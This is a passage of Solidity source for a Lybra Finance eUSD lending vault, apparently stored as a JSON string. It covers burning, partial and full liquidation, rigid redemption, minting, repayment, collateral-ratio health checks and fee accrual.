internal`_repay`function.\n     */\n    function burn(address onBehalfOf, uint256 amount) external {\n        require(onBehalfOf != address(0), \"BURN_TO_THE_ZERO_ADDRESS\");\n        _repay(msg.sender, onBehalfOf, amount);\n    }\n\n    /**\n     * @notice When overallCollateralRatio is above 150%, Keeper liquidates borrowers whose collateral ratio is below badCollateralRatio, using EUSD provided by Liquidation Provider.\n     *\n     * Requirements:\n     * - onBehalfOf Collateral Ratio should be below badCollateralRatio\n     * - collateralAmount should be less than 50% of collateral\n     * - provider should authorize Lybra to utilize EUSD\n     * @dev After liquidation, borrower's debt is reduced by collateralAmount * etherPrice, collateral is reduced by the collateralAmount corresponding to 110% of the value. Keeper gets keeperRatio / 110 of Liquidation Reward and Liquidator gets the remaining stETH.\n     */\n    function liquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {\n        uint256 assetPrice = getAssetPrice();\n        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];\n        require(onBehalfOfCollateralRatio < badCollateralRatio, \"Borrowers collateral ratio should below badCollateralRatio\");\n\n        require(assetAmount * 2 <= depositedAsset[onBehalfOf], \"a max of 50% collateral can be liquidated\");\n        require(EUSD.allowance(provider, address(this)) > 0, \"provider should authorize to provide liquidation EUSD\");\n        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n\n        _repay(provider, onBehalfOf, eusdAmount);\n        uint256 reducedAsset = (assetAmount * 11) / 10;\n        totalDepositedAsset -= reducedAsset;\n        depositedAsset[onBehalfOf] -= reducedAsset;\n        uint256 reward2keeper;\n        if (provider == msg.sender) {\n            collateralAsset.transfer(msg.sender, reducedAsset);\n        } else {\n            reward2keeper = (reducedAsset * configurator.vaultKeeperRatio(address(this))) / 110;\n            collateralAsset.transfer(provider, reducedAsset - reward2keeper);\n            collateralAsset.transfer(msg.sender, reward2keeper);\n        }\n        emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, reducedAsset, reward2keeper, false, block.timestamp);\n    }\n\n    /**\n     * @notice When overallCollateralRatio is below badCollateralRatio, borrowers with collateralRatio below 125% could be fully liquidated.\n     * Emits a `LiquidationRecord` event.\n     *\n     * Requirements:\n     * - Current overallCollateralRatio should be below badCollateralRatio\n     * - `onBehalfOf`collateralRatio should be below 125%\n     * @dev After Liquidation, borrower's debt is reduced by collateralAmount * etherPrice, deposit is reduced by collateralAmount * borrower's collateralRatio. Keeper gets a liquidation reward of `keeperRatio / borrower's collateralRatio\n     */\n    function superLiquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {\n        uint256 assetPrice = getAssetPrice();\n        require((totalDepositedAsset * assetPrice * 100) / poolTotalEUSDCirculation < badCollateralRatio, \"overallCollateralRatio should below 150%\");\n        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];\n        require(onBehalfOfCollateralRatio < 125 * 1e18, \"borrowers collateralRatio should below 125%\");\n        require(assetAmount <= depositedAsset[onBehalfOf], \"total of collateral can be liquidated at most\");\n        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n        if (onBehalfOfCollateralRatio >= 1e20) {\n            eusdAmount = (eusdAmount * 1e20) / onBehalfOfCollateralRatio;\n        }\n        require(EUSD.allowance(provider, address(this)) >= eusdAmount, \"provider should authorize to provide liquidation EUSD\");\n\n        _repay(provider, onBehalfOf, eusdAmount);\n\n        totalDepositedAsset -= assetAmount;\n        depositedAsset[onBehalfOf] -= assetAmount;\n        uint256 reward2keeper;\n        if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + configurator.vaultKeeperRatio(address(this)) * 1e18) {\n            reward2keeper = ((assetAmount * configurator.vaultKeeperRatio(address(this))) * 1e18) / onBehalfOfCollateralRatio;\n            collateralAsset.transfer(msg.sender, reward2keeper);\n        }\n        collateralAsset.transfer(provider, assetAmount - reward2keeper);\n\n        emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, assetAmount, reward2keeper, true, block.timestamp);\n    }\n\n    /**\n     * @notice When stETH balance increases through LSD or other reasons, the excess income is sold for EUSD, allocated to EUSD holders through rebase mechanism.\n     * Emits a `LSDistribution` event.\n     *\n     * *Requirements:\n     * - stETH balance in the contract cannot be less than totalDepositedAsset after exchange.\n     * @dev Income is used to cover accumulated Service Fee first.\n     */\n    function excessIncomeDistribution(uint256 payAmount) external virtual;\n\n    /**\n     * @notice Choose a Redemption Provider, Rigid Redeem `eusdAmount` of EUSD and get 1:1 value of stETH\n     * Emits a `RigidRedemption` event.\n     *\n     * *Requirements:\n     * - `provider` must be a Redemption Provider\n     * - `provider`debt must equal to or above`eusdAmount`\n     * @dev Service Fee for rigidRedemption `redemptionFee` is set to 0.5% by default, can be revised by DAO.\n     */\n    function rigidRedemption(address provider, uint256 eusdAmount) external virtual {\n        require(configurator.isRedemptionProvider(provider), \"provider is not a RedemptionProvider\");\n        require(borrowed[provider] >= eusdAmount, \"eusdAmount cannot surpass providers debt\");\n        uint256 assetPrice = getAssetPrice();\n        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];\n        require(providerCollateralRatio >= 100 * 1e18, \"provider's collateral ratio should more than 100%\");\n        _repay(msg.sender, provider, eusdAmount);\n        uint256 collateralAmount = (((eusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;\n        depositedAsset[provider] -= collateralAmount;\n        totalDepositedAsset -= collateralAmount;\n        collateralAsset.transfer(msg.sender, collateralAmount);\n        emit RigidRedemption(msg.sender, provider, eusdAmount, collateralAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Mints eUSD tokens for a user.\n     * @param _provider The provider's address.\n     * @param _onBehalfOf The user's address.\n     * @param _mintAmount The amount of eUSD tokens to be minted.\n     * @param _assetPrice The current collateral asset price.\n     * @dev Mints eUSD tokens for the specified user, updates the total supply and borrowed balance,\n     * refreshes the mint reward for the provider, checks the health of the provider,\n     * and emits a Mint event.\n     * Requirements:\n     * The total supply plus mint amount must not exceed the maximum supply allowed for the vault.\n     * The provider must have sufficient borrowing capacity to mint the specified amount.\n     */\n    function _mintEUSD(address _provider, address _onBehalfOf, uint256 _mintAmount, uint256 _assetPrice) internal virtual {\n        require(poolTotalEUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), \"ESL\");\n        try configurator.refreshMintReward(_provider) {} catch {}\n        borrowed[_provider] += _mintAmount;\n\n        EUSD.mint(_onBehalfOf, _mintAmount);\n        _saveReport();\n        poolTotalEUSDCirculation += _mintAmount;\n        _checkHealth(_provider, _assetPrice);\n        emit Mint(msg.sender, _onBehalfOf, _mintAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Burn _provideramount EUSD to payback minted EUSD for _onBehalfOf.\n     *\n     * @dev Refresh LBR reward before reducing providers debt. Refresh Lybra generated service fee before reducing totalEUSDCirculation.\n     */\n    function _repay(address _provider, address _onBehalfOf, uint256 _amount) internal virtual {\n        uint256 amount = borrowed[_onBehalfOf] >= _amount ? _amount : borrowed[_onBehalfOf];\n\n        EUSD.burn(_provider, amount);\n        try configurator.refreshMintReward(_onBehalfOf) {} catch {}\n\n        borrowed[_onBehalfOf] -= amount;\n        _saveReport();\n        poolTotalEUSDCirculation -= amount;\n        emit Burn(_provider, _onBehalfOf, amount, block.timestamp);\n    }\n\n    /**\n     * @dev Get USD value of current collateral asset and minted EUSD through price oracle / Collateral asset USD value must higher than safe Collateral Ratio.\n     */\n    function _checkHealth(address _user, uint256 _assetPrice) internal view {\n        if (((depositedAsset[_user] * _assetPrice * 100) / borrowed[_user]) < configurator.getSafeCollateralRatio(address(this))) revert(\"collateralRatio is Below safeCollateralRatio\");\n    }\n\n    function _saveReport() internal {\n        feeStored += _newFee();\n        lastReportTime = block.timestamp;\n    }\n\n    function _newFee() internal view returns (uint256) {\n        return (poolTotalEUSDCirculation * configurator.vaultMintFeeApy(address(this)) * (block.timestamp - lastReportTime)) / (86400 * 365) / 10000;\n    }\n\n    /**\n     * @dev Return USD value of current ETH through Liquity PriceFeed Contract.\n     */\n    function _etherPrice() internal returns (uint256) {\n        return etherOracle.fetchPrice();\n    }\n\n    function getBorrowedOf(address user) external view returns (uint256) {\n        return borrowed[user];\n    }\n\n    function getPoolTotalEUSDCirculation() external view returns (uint256) {\n        return poolTotalEUSDCirculation;\n    }\n\n    function getAsset() external view virtual returns (address) {\n        return address(collateralAsset);\n    }\n\n    function getVaultType() external pure returns (uint8) {\n        return vaultType;\n    }\n\n    function getAssetPrice() public virtual returns (uint256);\n}"
    }
  ]
}